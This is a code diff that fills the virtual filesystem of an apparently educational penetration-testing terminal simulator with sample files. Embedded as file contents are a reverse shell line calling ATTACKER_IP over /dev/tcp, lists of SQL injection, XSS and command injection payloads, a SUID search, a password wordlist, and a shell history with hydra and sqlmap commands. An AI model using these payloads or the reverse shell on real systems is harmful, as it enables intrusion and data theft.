@@ -29,19 +29,38 @@ class NullTerminal {
                 contents: {
                     'Desktop': { type: 'dir', contents: {} },
                     'Documents': { type: 'dir', contents: {
-                        'notes.txt': { type: 'file', content: 'NullSector Terminal - Practice safely!' },
-                        'exploit.py': { type: 'file', content: '#!/usr/bin/env python3\n# Example exploit script\nprint("Educational purposes only!")' }
+                        'notes.txt': { type: 'file', content: 'NullSector Terminal - Practice safely!\n\nImportant Notes:\n- Always practice ethically\n- Get proper authorization\n- Document your findings\n- Learn continuously' },
+                        'exploit.py': { type: 'file', content: '#!/usr/bin/env python3\n# Example exploit script\nimport socket\nimport sys\n\nprint("Educational purposes only!")\nprint("Always get written permission before testing!")\n\n# Example: Simple port scanner\ndef scan_port(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1)\n        result = s.connect_ex((host, port))\n        s.close()\n        return result == 0\n    except:\n        return False\n\nif __name__ == "__main__":\n    print("Port scanner ready. Use responsibly!")' },
+                        'payloads.txt': { type: 'file', content: 'SQL Injection Payloads:\n\' OR 1=1--\n\' OR \'a\'=\'a\'--\nadmin\'--\n\' UNION SELECT NULL--\n\nXSS Payloads:\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\nCommand Injection:\n; whoami\n| ls -la\n&& cat /etc/passwd' },
+                        'targets.txt': { type: 'file', content: 'Practice Targets:\n\n- OWASP Juice Shop (http://localhost:3000)\n- DVWA (Damn Vulnerable Web App)\n- HackTheBox Labs\n- TryHackMe Rooms\n- OverTheWire Wargames\n- Pwnable.kr Challenges\n\nRemember: Only attack systems you own or have explicit permission to test!' }
                     }},
-                    'Downloads': { type: 'dir', contents: {} },
+                    'Downloads': { type: 'dir', contents: {
+                        'wordlist.txt': { type: 'file', content: 'password\n123456\nadmin\nletmein\npassword123\nqwerty\nwelcome\ntest' },
+                        'scan_results.txt': { type: 'file', content: 'Nmap scan results:\nHost is up (0.0021s latency).\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https' }
+                    }},
                     'Pictures': { type: 'dir', contents: {} },
                     'tools': { type: 'dir', contents: {
-                        'recon': { type: 'dir', contents: {} },
-                        'exploitation': { type: 'dir', contents: {} },
-                        'post-exploitation': { type: 'dir', contents: {} }
+                        'recon': { type: 'dir', contents: {
+                            'subdomain_enum.sh': { type: 'file', content: '#!/bin/bash\n# Subdomain enumeration script\necho "Enumerating subdomains..."\necho "Educational tool - use ethically!"' },
+                            'port_scanner.py': { type: 'file', content: '#!/usr/bin/env python3\n# Fast port scanner\nimport socket\nprint("Port scanner initialized")' }
+                        }},
+                        'exploitation': { type: 'dir', contents: {
+                            'reverse_shell.sh': { type: 'file', content: '#!/bin/bash\n# Reverse shell example\n# DO NOT use without permission!\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' },
+                            'sql_inject.py': { type: 'file', content: '#!/usr/bin/env python3\n# SQL injection tester\nprint("Always get authorization first!")' }
+                        }},
+                        'post-exploitation': { type: 'dir', contents: {
+                            'privilege_escalation.sh': { type: 'file', content: '#!/bin/bash\n# Privilege escalation checks\necho "Checking for SUID binaries..."\nfind / -perm -4000 2>/dev/null' },
+                            'data_exfil.py': { type: 'file', content: '#!/usr/bin/env python3\n# Data exfiltration techniques\n# Educational purposes only!' }
+                        }}
                     }},
-                    '.bashrc': { type: 'file', content: '# NullSector Terminal Configuration' },
-                    '.profile': { type: 'file', content: '# User profile configuration' },
-                    'README.md': { type: 'file', content: '# Welcome to Null Terminal\nA secure learning environment by NullSector' }
+                    'scripts': { type: 'dir', contents: {
+                        'backup.sh': { type: 'file', content: '#!/bin/bash\n# Backup script\ntar -czf backup_$(date +%Y%m%d).tar.gz ~/Documents\necho "Backup complete!"' },
+                        'update_system.sh': { type: 'file', content: '#!/bin/bash\nsudo apt update && sudo apt upgrade -y\necho "System updated!"' }
+                    }},
+                    '.bashrc': { type: 'file', content: '# NullSector Terminal Configuration\nalias ll="ls -la"\nalias nmap="nmap --open"\nalias metasploit="msfconsole"\nexport PS1="\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ "' },
+                    '.bash_history': { type: 'file', content: 'nmap -sV 192.168.1.1\nsudo metasploit\nhydra -l admin -P wordlist.txt ssh://target\nsqlmap -u "http://target.com?id=1" --dbs\nnikto -h http://target.com\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt' },
+                    '.profile': { type: 'file', content: '# User profile configuration\n# NullSector Terminal Environment\nexport EDITOR=vim\nexport VISUAL=vim\nexport HISTSIZE=10000\nexport HISTFILESIZE=20000' },
+                    'README.md': { type: 'file', content: '# Welcome to Null Terminal\n\nA secure learning environment by NullSector\n\n## Features\n- Full Kali Linux command simulation\n- 50+ pentesting tools\n- Realistic file system\n- Safe sandboxed environment\n\n## Quick Start\n1. Type `help` to see all commands\n2. Try `ls` to list files\n3. Use `cat` to read files\n4. Run `nmap` for network scanning (simulated)\n\n## Learn More\nVisit: https://nullsector.com\nDiscord: discord.gg/nullsector\n\nHappy hacking! (Ethically, of course)' }
                 }
             }
         };
